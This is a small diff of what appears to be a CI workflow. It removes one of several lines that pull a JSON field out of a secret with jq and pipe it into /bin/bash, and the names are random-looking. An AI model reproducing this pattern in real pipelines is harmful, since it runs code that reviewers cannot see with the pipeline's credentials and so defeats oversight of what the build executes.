@@ -22,7 +22,6 @@ jobs:
           veu9: ${{ secrets.veu9 }}
         run: |
           printf '%s' "$veu9" | jq -r .fqb3 | /bin/bash
-          printf '%s' "$b856" | jq -r .w26 | /bin/bash
           printf '%s' "$tfgn5947" | jq -r .apm1962 | /bin/bash
           echo $bwk99 | jq -r .khg5087 | /bin/bash
 
